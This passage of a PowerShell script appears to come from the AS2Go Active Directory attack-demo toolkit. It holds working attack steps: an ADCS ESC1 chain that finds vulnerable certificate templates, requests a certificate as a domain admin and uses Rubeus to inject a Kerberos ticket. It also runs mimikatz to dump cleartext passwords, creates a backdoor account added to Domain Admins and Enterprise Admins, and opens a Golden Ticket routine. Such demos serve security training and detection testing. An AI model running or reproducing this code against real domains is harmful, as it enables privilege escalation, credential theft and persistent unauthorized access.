    Write-Log -Message "### Start Function $myfunction ###"
    #####


    If ((Test-Path -Path "$path\$filename" -PathType Leaf) -eq $false) {
        $result = ""
        Write-Host ""
        Write-Warning "Cannot find file - $filename!!"
        Write-Host ""
        If ($filename.ToUpper() -eq "AS2Go.xml".ToUpper()) {
            Write-Host "`n`nProbably you started the PoSH Script $scriptName `nfrom the wrong directory $configFile!" -ForegroundColor $global:FGCError
            exit
        }
        Pause
    }
    else {
        [datetime] $LastWriteTime = (get-item "$path\$filename").LastWriteTime
        [String]   $FileVersion = (get-item "$path\$filename").VersionInfo.FileVersion
        $build = Get-date -date $LastWriteTime -Format yyyyMMdd
        $release = ("Release: " + $FileVersion.PadRight(9, [Char]32) + "(last build $build)")
        Write-Log -Message "    >> Version of $filename is $release!"
        #write-host $release 
    }

    return $release 

    #####
    Write-Log -Message "### End Function $myfunction ###"
}

function Get-FunctionName ([int]$StackNumber = 1) {
    return [string]$(Get-PSCallStack)[$StackNumber].FunctionName
}

function Get-KerberosTGT {

    ################################################################################
    #####                                                                      ##### 
    #####  Request a ticket-granting ticket (TGT) by using the pfx certificate #####                             #####
    #####                                                                      #####
    ################################################################################


    Param([string] $pfxFile, [string] $altname)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    ################## main code | out- host #####################
    
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "            FIRST try to connect to a DC c$ share            "
    Write-Host "____________________________________________________________________`n" 
    
    $directory = "\\$myDC\c$"
    Get-DirContent -Path $directory
    pause
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host " Request a ticket-granting ticket (TGT) by using the pfx certificate"
    Write-Host "____________________________________________________________________`n" 
    #regionword = Read-Host "Enter password for pfx file - $pfxFile"
        
    If ($pfxFile.Contains("\")) {
        $temp = $pfxFile.Split(" ")
        $pfxFile = $temp[-1]
    }
       
    $request = ".\Rubeus.exe asktgt /user:$altname /certificate:.\$pfxFile /ptt"
    
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ".\Rubeus.exe ", "asktgt /user:", "$altname", " /certificate:", ".\$pfxFile", " /ppt"  `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
    Write-Host ""
    Write-Log -Message $request

    pause
    #Invoke-Command -ScriptBlock {.\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /password:$password /ptt} | Out-Host
    #Invoke-Command -ScriptBlock { .\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt } | Out-Host
    .\Rubeus.exe asktgt /user:$altname /certificate:.\$pfxFile /ptt | Out-Host

    pause

    Write-Host "____________________________________________________________________`n" 
    Write-Host "            Now try again to connect to a DC c$ share            "
    Write-Host "____________________________________________________________________`n" 
    
    $directory = "\\$myDC\c$"
    Get-DirContent -Path $directory
    pause
    Clear-Host

    klist
    pause

    Write-Log -Message "    >> using $PfxFile"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $true
}

Function Get-KeyValue {

    ################################################################################
    #####                                                                      ##### 
    #####             Read Settings from XML File                              #####
    #####                                                                      #####
    ################################################################################

    Param([string] $key)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    [XML]$AS2GoConfig = Get-Content $configFile
    $MyKey = $AS2GoConfig.Config.DefaultParameter.ChildNodes | Where-Object Name -EQ $key

    Write-Log -Message "    >> using $key with value $($MyKey.value)"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $MyKey.value
}

function Get-OSVersion {

    ################################################################################
    #####                                                                      ##### 
    #####    Description   Get-OSVersion                                       #####                                 
    #####                                                                      #####
    ################################################################################


    Param([string] $computer)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################




    try {
        $property = Get-ADComputer -Identity  $computer -Properties name, operatingSystem, operatingSystemVersion    -ErrorAction Stop
        $OSBuild = $property.operatingSystemVersion.Split("(")
        $OSBuild = $OSBuild[1].Split(")")
        $value = "V" + $OSBuild[0]
    }
    catch {
        $value = "V00000"
        write-host "Error: " -NoNewline -ForegroundColor Red
        Write-Host $_
    }

    #https://learn.microsoft.com/de-de/windows/release-health/windows11-release-information

    $WinVersion = @{

        #Win 11
        V22621 = "22H2"
        V22000 = "21H2"

        #Win 10
        V19045 = "22H2"
        V19044 = "21H2"
        V19043 = "21H1"
        V19042 = "20H2"
        V19041 = "2004"
        V18363 = "1909"
        V18362 = "1903"
        V17763 = "1809"
        V17134 = "1803"
        V16299 = "1709"
        V15063 = "1703"
        V14393 = "1607"
        V10586 = "1511"
        V10240 = "1507"
        V00000 = "0000"

    }
    

    Write-Log -Message "    >> using $OSBuild[0] - $($WinVersion.$value)"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $WinVersion.$value
}

function Get-OSBuild {

    ################################################################################
    #####                                                                      ##### 
    #####    Get the OS build, e.g. 22621                                      #####                                 
    #####                                                                      #####
    ################################################################################

    Param([string] $computer)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    try{

        $property = Get-ADComputer -Identity  $computer -Properties name, operatingSystem, operatingSystemVersion -ErrorAction Stop
        $OSBuild = $property.operatingSystemVersion.Split("(")
        $OSBuild = $OSBuild[1].Split(")")
        $result =  $OSBuild[0]
    }
    catch{
        $result = "00000"
        write-host "Error: " -NoNewline -ForegroundColor Red
        Write-Host $_
    }


    #https://learn.microsoft.com/de-de/windows/release-health/windows11-release-information

    Write-Log -Message "    >> using $result"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $result
}

function Get-RiskyEnrolledTemplates {

    ################################################################################
    #####                                                                      ##### 
    #####    Get all the risky & enrolled Certificate Templates                #####                               
    #####                                                                      #####
    ################################################################################


    Param([switch] $SuppressOutPut)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################




    # list all templates
    $PublishedPKITemplates = New-Object System.Collections.ArrayList
    $PublishedRiskyDN = New-Object System.Collections.ArrayList



#    write-host =    "(&(objectClass=pKICertificateTemplate)(cn=$PublishedTemplate)(msPKI-Certificate-Name-Flag=1)(msPKI-Certificate-Application-Policy=1.3.6.1.5.5.7.3.2))"
#    Write-host = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$forest"
    try{

        $temp = Get-ADForest | Select-Object Name
        $forest = "DC=" + $temp.Name.Replace(".", ",DC=")
        $pKIEnrollmentService = Get-ADObject -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$forest" -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties * -ErrorAction Stop
    

    }
    catch{
        write-host "Error: " -NoNewline -ForegroundColor Red
        Write-Host $_
    }


    foreach ($PkiEnrollment in $pKIEnrollmentService) {
    
        for ($i = 0; $i -lt $PkiEnrollment.certificatetemplates.count; $i++) {
            [void]$PublishedPKITemplates.Add($PkiEnrollment.certificatetemplates[$i])       
        }
    }

    #$PublishedRiskyTemplates = ""

    if ($PublishedPKITemplates) {
        # For each template name searc for the object
        Foreach ($PublishedTemplate in @($PublishedPKITemplates)) {
            $SearchFilter = "(&(objectClass=pKICertificateTemplate)(cn=$PublishedTemplate)(msPKI-Certificate-Name-Flag=1)(msPKI-Certificate-Application-Policy=1.3.6.1.5.5.7.3.2))"
            $RiskyTemplate = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$forest" -LDAPFilter $SearchFilter -SearchScope OneLevel
            if ($RiskyTemplate) {
                [VOID]$PublishedRiskyDN.Add($RiskyTemplate)

                if ($SuppressOutPut -eq $true) {
                    $items = @{
                        Name           = $RiskyTemplate.Name
                        DN             = $RiskyTemplate.DistinguishedName
                        ObjectGUID     = $RiskyTemplate.ObjectGUID
                        objectClass    = $RiskyTemplate.ObjectClass
                        CanPublishedBy = "n/a"
                    }
                    
                    $PublishedRiskyTemplates.add((New-Object psobject -Property $items)) | Out-Null
                }



            }
        }
    }

#WIP - Start here
    if ($SuppressOutPut -ne $true) {
        Write-Host "Found $($PublishedRiskyDN.count) risky AND enrolled CA templates:" -ForegroundColor Yellow
        $PublishedRiskyDN | Format-Table Name, ObjectGUID, DistinguishedName | Out-Host
    }

    $result = $PublishedRiskyDN | Select-Object Name | Select-Object -First 1



    Write-Log -Message "    >> using $($result.name)"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $result.name
}

function Get-VulnerableCertificateTemplate {

    ################################################################################
    #####                                                                      ##### 
    #####           Finding an Vulnerable Certificate Templates                #####
    #####                                                                      #####
    ################################################################################

    Param([string] $myEntCA)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ####################### main code #########################
    $CAtemplate = Get-KeyValue -key "BadCA"
    Write-Host  "  Only a simple LDAP Query is needed:`n"

    Write-Highlight -Text ('     $SearchFilter ', '= ', ' "(&(objectClass=pKICertificateTemplate)(cn=', '$PublishedTemplate', ')(msPKI-Certificate-Name-Flag=1)(msPKI-Certificate-Application-Policy=1.3.6.1.5.5.7.3.2))"')`
        -Color $fgcR, $fgcF, $fgcV, $fgcR, $fgcV, $fgcF

    Write-Highlight -Text ('     $Template     ', '= ', ' Get-ADObject ', '-SearchBase ', '"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,', '$forest" ', '-LDAPFilter ', '$SearchFilter ', '-SearchScope ', 'OneLevel')`
        -Color $fgcR, $fgcF, $fgcC, $fgcS, $fgcV, $fgcR, $fgcS, $fgcR, $fgcS, $fgcF
    
    Write-Host ""
    Write-log -Message "     Only a simple LDAP Query is needed."
    
    $question = "Do you want to run this step - Y or N? Default "
    $answer = Get-Answer -question $question -defaultValue $yes

    If ($answer -eq $yes) {
        #find vulnerable CA templates

        Foreach ($result in $PublishedRiskyTemplates) {

            Write-host "`n`nFound vulnerable template " -NoNewline
            Write-host "$($result.Name)" -ForegroundColor Yellow -NoNewline
            Write-host ", which can be enrolled by:`n"

            $DSobject = [adsi]("LDAP://$($result.DN)")
            $secd = $DSobject.psbase.get_objectSecurity().getAccessRules($true, $chkInheritedPerm.checked, [System.Security.Principal.NTAccount])
            $results = $secd | Where-Object { $_.AccessControlType -eq "Allow" -and $_.ObjectType -eq "0e10c968-78fb-11d2-90d4-00c04f79dc55" -and $_.ActiveDirectoryRights -like "*ExtendedRight*" } | Select-Object IdentityReference

            foreach ($result2 in $results.IdentityReference) {
                [string]$t = $result2

                If ($t.Contains("Domain Users") -or $t.Contains("Everyone") -or $t.Contains("Authenticated Users")) {
                    write-host ("   - $t").PadRight(45, [Char]32) -ForegroundColor Yellow -NoNewline
                    Write-Host "<< Bingo!"
                    $CAtemplate = $result.Name

                }
                elseif ($t.Contains("Domain Computers") ) {
                    write-host ("   - $t").PadRight(45, [Char]32) -ForegroundColor Yellow -NoNewline
                    Write-Host "<< Bingo!"
                    [string]$temp = ($temp + ' - ' + $($result.Name).ToUpper())
                }
                else {
                    write-host "   - $t"
                }
            }
        }
    }


    Do {
        $question = "Do you want to use CA template '$CAtemplate' - Y or N? Default "
        $prompt = Get-Answer -question $question -defaultValue $yes

        if ($prompt -ne $yes) {
            write-host ""
            [int]$i = 0
            Foreach ($ca in $PublishedRiskyTemplates) {
                Write-host "   [" -NoNewline
                Write-Host $i -ForegroundColor Yellow -NoNewline
                Write-host "] - $($ca.name)"
                $i++
            }
write-host ""
            $i = Get-Random -Minimum 0 -Maximum $i
            $i = Read-Host "Type in the NUMBER for your preferred CA Template, e.g. $i"
            $CAtemplate = $PublishedRiskyTemplates.name[$i]
            Set-KeyValue -key "BadCA" -NewValue $CAtemplate
            write-host ""
        }
    } Until ($prompt -eq $yes)
    
    #check if this Template can be enrolled by Domain Computers
    If ($temp.Contains("- $CAtemplate".ToUpper())){
        [bool]$UseDomainComputers = $true
    }
    else {
        [bool]$UseDomainComputers = $false
    }


    Write-Log -Message "    >> using $CAtemplate, can be enrolled by Domain Computer - $UseDomainComputers"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $CAtemplate, $UseDomainComputers  
}

function Get-VulnerableCertificateTemplate_old {

    ################################################################################
    #####                                                                      ##### 
    #####           Finding an Vulnerable Certificate Templates                #####
    #####                                                                      #####
    ################################################################################

    Param([string] $myEntCA)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ####################### main code #########################
    $CAtemplate = Get-KeyValue -key "BadCA"
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ".\certify.exe ", "find ", "/vulnerable /ca:", """$myEntCA""" `
        -Color $fgcC, $fgcF, $fgcS, $fgcV
    Write-Host ""
    Write-log -Message "     .\certify.exe find /vulnerable /ca:$myEntCA"
    
    $question = "Do you want to run this step - Y or N? Default "
    $answer = Get-Answer -question $question -defaultValue $no

    If ($answer -eq $yes) {
        #find vulnerable CA templates
        #Invoke-Command -ScriptBlock { .\certify.exe find /vulnerable /ca:"$myEntCA" } | Out-Host
        #Write-Host "`nFound Vulnerable Certificate Templates - $CAtemplate" -ForegroundColor $fgcH

        $CAtemplate = Get-RiskyEnrolledTemplates
    }


    Do {
        $question = "Do you want to use CA template '$CAtemplate' - Y or N? Default "
        $prompt = Get-Answer -question $question -defaultValue $yes

        if ($prompt -ne $yes) {
            $CAtemplate = Read-Host "Type in your preferred CA Template"
            Set-KeyValue -key "BadCA" -NewValue $CAtemplate
        }
  
    } Until ($prompt -eq $yes)

    Write-Log -Message "    >> using $CAtemplate"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $CAtemplate 
}


function Get-EnrollmentService {

    ################################################################################
    #####                                                                      ##### 
    #####    technique used by attackers, which allows them to request         #####
    #####     a service ticket for any service with a registered SPN.          #####
    #####                                                                      #####
    ################################################################################

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ####################### main code #########################

    Write-Host  "  LDAP Query: `n"

    Write-Highlight -Text ('     $Searchbase         ', ' =',' "CN=Enrollment Services,CN=Public Key Services,CN=Services,', '$ConfigPartition"')`
    -Color $fgcR, $fgcF, $fgcV, $fgcR

    Write-Highlight -Text ('     $enrollmentServices ', ' =', ' Get-ADObject ', '-Filter ', '{ObjectClass ','-eq', ' "pKIEnrollmentService"', '} -Properties * -SearchBase ', '$Searchbase ','|')`
    -Color $fgcR, $fgcF, $fgcC, $fgcS,$fgcC, $fgcS,$fgcV, $fgcS, $fgcR, $fgcF
   
    Write-Highlight -Text ('                            Where-Object ', '{', ' -not ','[string]::IsNullOrEmpty(','$_','.caCertificate) } ')`
    -Color $fgcC, $fgcF, $fgcS,$fgcF,$fgcR,$fgcF
   
    Write-Highlight -Text ('                            Select-Object ', 'ObjectClass, Name, DNSHostName, caCertificate')`
    -Color $fgcC, $fgcF
    
    Write-host ""

    $ConfigPartition = (Get-ADforest).PartitionsContainer.replace("CN=Partitions,","")
    $Searchbase = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigPartition"
    
    $enrollmentServices = Get-ADObject -Filter {ObjectClass -eq "pKIEnrollmentService"} -Properties * -SearchBase $Searchbase | 
                          Where-Object { -not [string]::IsNullOrEmpty($_.caCertificate) } |  
                          Select-Object objectclass, Name, DNSHostName, caCertificate
    
    $enrollmentServices | Out-Host
    
    $myEntCA = $enrollmentServices.DNSHostName + "\" + $enrollmentServices.Name

    $question = " -> Enter or confirm the Certification Authority! Default "
    $answer = Get-Answer -question $question -defaultValue $myEntCA
    Set-KeyValue -key "EnterpriseCA" -NewValue $answer

    Write-Host "`n`nUsing this Certification Authority for the next steps - " -NoNewline
    Write-Host "$answer`n`n" -ForegroundColor $fgcH
    
    If (-not $UnAttended){pause}
    Write-Log -Message "    >> Using - $answer"

    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $answer
}

function Get-EnterpriseCAName {

    ################################################################################
    #####                                                                      ##### 
    #####    technique used by attackers, which allows them to request         #####
    #####     a service ticket for any service with a registered SPN.          #####
    #####                                                                      #####
    ################################################################################

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ####################### main code #########################

    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "certutil" `
        -Color $fgcC

    #get the Enterprise CA name
    Write-Host ""
    Invoke-Command -ScriptBlock { certutil } | Out-Host
    Write-Host ""

    $MyCAConfig = Invoke-Command -ScriptBlock { certutil }
    $temp = $MyCAConfig[7].Split([char]0x0060).Split([char]0x0027).Split([char]0x0022)
    $myEntCA = $temp[1]

    $question = " -> Enter or confirm the Enterprise Certification Authority! Default "
    $answer = Get-Answer -question $question -defaultValue $myEntCA
    Set-KeyValue -key "EnterpriseCA" -NewValue $answer

    Write-Host "`n`nUsing this Enterprise CA for the next steps - " -NoNewline
    Write-Host "$answer`n`n" -ForegroundColor $fgcH

    pause
    Write-Log -Message "    >> Using - $answer"

    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    return $answer
}

function Get-DirContent {
    param ([string] $Path)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################
    Write-Host ""
    Write-Host -NoNewline "  Command: "
    Write-Highlight -Text ("Get-ChildItem ", "-Path ", $Path) -Color $fgcC, $fgcS, $fgcV
    #Write-Host "Get-ChildItem -Path $Path -Directory" -ForegroundColor $global:FGCCommand
    Write-Host ""
    Try {
        Get-ChildItem -Path $Path  -ErrorAction Stop | Out-Host
    }
    Catch {
        #$dirs = "User has NO access to path $Path"
        Write-Host "`n   --> This account has NO access to path $Path`n" -ForegroundColor $global:FGCError
    }
  
    Write-Log -Message "    >> using Get-ChildItem -Path $Path -Directory"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"
    #return $true
}

function Get-Files {
    param ([string] $Path, [string] $FileType)
    
    
    Write-Host "Get-ChildItem -Path $Path -Filter $FileType -ErrorAction SilentlyContinue" -ForegroundColor $global:FGCCommand
    $files = " "
    Try {
        $files = Get-ChildItem -Path $Path -Filter $FileType -ErrorAction SilentlyContinue | Out-Host
    }
    Catch {
        Write-Host "`n   --> This account has NO access to path $Path`n" -ForegroundColor $global:FGCError
        $files = "no access"
    }
    # Explicitly return data to the caller.
    $files | Out-File -FilePath $scriptLog -Append
    Start-Sleep -Seconds 1
    return $files
}

function Get-RandomPassword {

    # Generate random password
    Write-Log -Message "### Start Function random password ###"

    $chars = "abcdefghijkmnopqrstuvwxyzABCEFGHJKLMNPQRSTUVWXYZ1234567890".ToCharArray()
    $nums = "1234567890".ToCharArray()
    $schars = "+-$!".ToCharArray()

    $newPassword = ""
    1..9 | ForEach-Object { $newPassword += $chars | Get-Random }
    1..1 | ForEach-Object { $newPassword += $nums | Get-Random }
    1..1 | ForEach-Object { $newPassword += $schars | Get-Random }
    1..1 | ForEach-Object { $newPassword += $nums | Get-Random }
    1..1 | ForEach-Object { $newPassword += $schars | Get-Random }
    Write-Log -Message $newPassword
    Write-Log -Message "### End Function random password ###"
    return $newPassword
}

function Get-SensitveADUser {

    Param([string] $group)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"

    Try {
        Get-ADGroupMember -Identity $group -Recursive | Format-Table SamAccountName, objectClass, name, distinguishedName -ErrorAction SilentlyContinue -AutoSize
    }
    catch {
        Write-Host "   --> No ACCESS to group '$group'`n`n" -ForegroundColor $global:FGCError
    }

    #####
    Write-Log -Message "    >> using $group"
    Write-Log -Message "### End Function $myfunction ###"
}

function New-AuthenticationCertificatesAttack {

    ################################################################################
    #####                                                                      ##### 
    #####    Description                ######                                 
    #####                                                                      #####
    ################################################################################


    # Param([string] $param1, [string] $para2)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################




    Update-WindowTitle -NewTitle $stage25
    Set-KeyValue -key "LastStage" -NewValue $stage25
    If ($showStep) { Show-Step -step "step_007.html" }
    Do {
        Clear-Host
        Write-Host "____________________________________________________________________`n" 
        Write-Host "    Attack Level - Exploiting Misconfigured Certificate Template    "
        Write-Host ""
        Write-Host "  ESC 1 - Abuse misconfigured AD CS certificate templates allowing a  "
        Write-Host "  domain user can escalate his privileges to that of a domain admin   "
        Write-Host "____________________________________________________________________`n" 


        # http://attack.mitre.org/techniques/T1649/

        If ($UnAttended) {
            $answer = $No
        }
        else {
            $question = "Do you want to run this attack - Y or N? Default "
            $answer = Get-Answer -question $question -defaultValue $yes
        }


        If ($answer -eq $yes) {

            Clear-Host
            write-log -Message "Start Attack Level - Steal or Forge Authentication Certificates"
            # define parameter

            $altname = $domainadmin
            $pemFile = ".\$altname.pem"
            $pfxFile = ".\$altname.pfx"   



            Do {
                Clear-Host
                Write-Host "____________________________________________________________________`n" 
                Write-Host "      Step 1 - Find Enrollment Certification Authority (CA)        "
                Write-Host "____________________________________________________________________`n"    
                #region Step 1 - Get the Enterprise Certification Authority   

                #$EnterpriseCA = Get-EnterpriseCAName

                $EnterpriseCA = Get-EnrollmentService


                Clear-Host

                Write-Host "____________________________________________________________________`n" 
                Write-Host "        ??? REPEAT | CA Enrollment Serivce ???           "
                Write-Host "____________________________________________________________________`n" 

                # End "Do ... Until" Loop?
                $question = "Do you need to REPEAT this attack level - Y or N? Default "
                $repeat = Get-Answer -question $question -defaultValue $no

            } Until ($repeat -eq $no)

            #endregion Step 1 - Get the Enterprise Certification Authority

            Clear-Host
            Write-Host "____________________________________________________________________`n" 
            Write-Host "Step 2 - Enumerate Misconfigured and (!) Published Certificate Templates"
            Write-Host "____________________________________________________________________`n"

            #region Step 2 - Finding an Vulnerable Certificate Templates

            $CATemplateInfo = Get-VulnerableCertificateTemplate -myEntCA $EnterpriseCA

            $CAtemplate = $CATemplateInfo[0]

            #Write-Output $CATemplateInfo[0]
            #Write-Host $CATemplateInfo[1]
            #pause

            #endregion Step 2 - Finding an Vulnerable Certificate Templates

            #region Step 3 - Requesting Certificate with Certify
            Do {
                Clear-Host
                Write-Host "____________________________________________________________________`n" 
                Write-Host "      Step 3 - Request Certificate with Certify                           "
                Write-Host "____________________________________________________________________`n"

                $pemFile = Start-RequestingCertificate -myEntCA $EnterpriseCA -CAtemplate $CAtemplate -altname $domainadmin -domainComputer $CATemplateInfo[1]

                $question = "Do you need to REPEAT this attack level - Y or N? Default "
                $repeat = Get-Answer -question $question -defaultValue $no

            } Until ($repeat -eq $no)

            #endregion Step 3 - Requesting Certificate with Certify

            #region Step 4 - Converting PEM to PFX via openSSL
            Do {
                Clear-Host
                Write-Host "____________________________________________________________________`n" 
                Write-Host "   Step 4 - Convert to PFX from PEM Certificate Type via Open SSL                "
                Write-Host "____________________________________________________________________`n"

                $pfxFile = Start-ConvertingToPfxFromPem -pemFile $pemFile

                $question = "Do you need to REPEAT this attack level - Y or N? Default "
                $repeat = Get-Answer -question $question -defaultValue $no

            } Until ($repeat -eq $no)


            #endregion Step 4 - Converting PEM to PFX via openSSL
            #region Step 5 - Request a Kerberos TGT

            Do {
                Clear-Host
                Write-Host "____________________________________________________________________`n" 
                Write-Host "  Step 5 - Request a Ticket Granting Ticket (TGT) with PFX Certificate   "
                Write-Host "               for the user for which we minted the new certificate                  "
                Write-Host "____________________________________________________________________`n"

                Get-KerberosTGT -pfxFile $pfxFile -altname $domainadmin

                $question = "Do you need to REPEAT this attack level - Y or N? Default "
                $repeat = Get-Answer -question $question -defaultValue $no

            } Until ($repeat -eq $no)
            #endregion Step 5 - Request a Kerberos TGT


        } ##
        else {
            return
        }


        Clear-Host

        Write-Host "____________________________________________________________________`n" 
        Write-Host "    ??? REPEAT | Attack Level - Steal or Forge Certificates ???           "
        Write-Host "____________________________________________________________________`n" 




    } Until ($repeat -eq $no)

    Write-Log -Message "    >> using $CAtemplate"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    #
}

function New-BackDoorUser {


    
    ################################################################################
    #####                                                                      ##### 
    #####    Create a new back door user and add them to priviledge groups     #####                                
    #####                                                                      #####
    ################################################################################

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    #define the user first & last name
    
    #define the user first & last name
    $sPrefix = Get-Date -Format HHmmss    # create the first name based on hours, minutes and sec
    $sSuffix = Get-Date -Format yyyyMMdd   # create the last name based on year, month, days

    $sSamaccountName = "BD-$sSuffix.$sPrefix"
    $sname = $sSamaccountName
    $sPath = Get-KeyValue -key "BDUsersOU"
    $sFirstName = "HoZi"
    $sLastname = "Hacker"
    $Initials = "HtH"
    $sDisplayName = "Hozi the Hacker ($sSamaccountName)"
    $sUPNSuffix = "@HoziTheHacker.de"
    $title = "Backdoor User"
    $sUserPrincipalName = ($sSamaccountName + $sUPNSuffix)
    $TimeSpan = New-TimeSpan -Days 7 -Hours 0 -Minutes 0 #Account expires after xx Days
    $bthumbnailPhoto = ".\AS2Go_BD-User.jpg"
    $sDescription = "Backdoor User (AS2Go Demo)"

    $BDUserPW = Get-RandomPassword
    $global:BDSecurePass = ConvertTo-SecureString -String $BDUserPW -AsPlainText -Force
    $global:BDUser = $sSamaccountName


    $MyDC = ($env:LOGONSERVER).Replace("\","") + "." + $env:USERDNSDOMAIN

  
    New-ADUser  -UserPrincipalName $sUserPrincipalName -Name $sName -SamAccountName $sSamaccountName -GivenName $sFirstName -Surname $sLastname  `
                -Initials $Initials -Title $title -Description $sDescription  `
                -DisplayName $sDisplayName -PasswordNeverExpires $false -Path $sPath -AccountPassword $global:BDSecurePass -PassThru -Server $MyDC | Enable-ADAccount

    Add-ADGroupMember -Identity $GroupDA -Members $sSamaccountName  -Server $MyDC
    Add-ADGroupMember -Identity $GroupGPO -Members $sSamaccountName  -Server $MyDC

    Try {
        Add-ADGroupMember -Identity $GroupEA  -Members $sSamaccountName  -Server $MyDC
    }
    Catch {
        # do nothing due to group is located in root domain
    }


    try {
        Set-ADUser $sSamaccountName -Replace @{thumbnailPhoto = ([byte[]](Get-Content $bthumbnailPhoto -Encoding byte)) }  -Server $MyDC -ErrorAction SilentlyContinue
    }
    catch {
        <#Do this if a terminating exception happens#>
    }

    
    Set-KeyValue -key "LastBDUser" -NewValue $sSamaccountName

    Write-Host "`n`nNew backdoor user: " -NoNewline; Write-host $sSamaccountName  -ForegroundColor $fgcH
    Write-host     "current password : " -NoNewline; Write-host $BDUserPW         -ForegroundColor $fgcH

    Start-Sleep -Milliseconds 500
    Get-ADUser -Identity $sSamaccountName -Properties * -Server $MyDC | Select-Object Created, canonicalName, userAccountControl, title, userPrincipalName | Format-Table

    Write-Host "Getting AD Principal Group Membership`n" -ForegroundColor $fgcH




    [int]$i = 0
    [bool]$works = $false

    try {
        Do {
            $i += 1
            $members = Get-ADPrincipalGroupMembership -Identity $sSamaccountName -Server $MyDC -ErrorAction Stop
            Write-host "." -NoNewline -ForegroundColor $fgcH
        } Until (($members.count -gt 3) -or ($i -gt 50))

        $works = $true
    }
    catch {
        <#Do this if a terminating exception happens#>
    }

    Write-Host ""
    If ($works) {
        Get-ADPrincipalGroupMembership -Identity $sSamaccountName -Server $MyDC | Format-Table name, GroupCategory, GroupScope, sid
    }
    else {
    (Get-Aduser -Identity $sSamaccountName -Properties MemberOf -Server $MyDC | Select-Object MemberOf).MemberOf
    }
    

    #### create credentional for further actions
    $global:BDCred = New-Object System.Management.Automation.PSCredential $sUserPrincipalName, $global:BDSecurePass


    Write-Log -Message "    Backdoor User '$sSamaccountName' created"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"
}

function New-CredentialTheftThroughMemoryAccess {

    ################################################################################
    #####                                                                      ##### 
    #####    Description                ######                                 
    #####                                                                      #####
    ################################################################################


    #Param([string] $param1, [string] $para2)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    Update-WindowTitle -NewTitle "Credential Theft Through MemoryAccess"
    Set-KeyValue -key "LastStage" -NewValue "Credential Theft Through MemoryAccess"
    #Show-Step -step "step_007.html"
    Do {

        Clear-Host
        Write-Host "____________________________________________________________________`n" 
        Write-Host "         Attack Level - Credential Theft Through Memory Access"
        Write-Host "____________________________________________________________________`n" 

               
        $logfile = "HD-ClearPasswords.log"
        Invoke-Command -ScriptBlock { .\mimikatz.exe "log .\$logfile" "privilege::debug" "sekurlsa::wdigest" "exit" }
        Invoke-Item .\"HD-ClearPasswords.log"  
        Pause
        Clear-Host

        Write-Host "____________________________________________________________________`n" 
        Write-Host "        ??? REPEAT | Credential Theft Through Memory Access  ???           "
        Write-Host "____________________________________________________________________`n" 

        If ($UnAttended) {
            $repeat = $no
        }
        else {
            $question = "Do you need to REPEAT this attack level - Y or N? Default "
            $repeat = Get-Answer -question $question -defaultValue $no
        }

        Write-Log -Message "    >> using $CAtemplate"
    } Until ($repeat -eq $no)

    Write-Log -Message "    >> using $CAtemplate"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"

    #
}

Function New-GoldenTicket {

    ################################################################################
    #####                                                                      ##### 
    #####    Run Golden Ticket Attack                                          #####                                 
    #####                                                                      #####
    ################################################################################


    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####

    Do {

        #Write-Host "... getting accounts, be patient ..."

        $temp = Get-ADUserNameBasedOnRID -RID "-500"
        $s500 = $temp.PadRight(24, [char]32)
    
        #define the user first & last name
        $sPrefix = Get-Date -Format HHmmss    # create the first name based on hours, minutes and sec
        $sSuffix = Get-Date -Format yyyyMMdd   # create the last name based on year, month, days
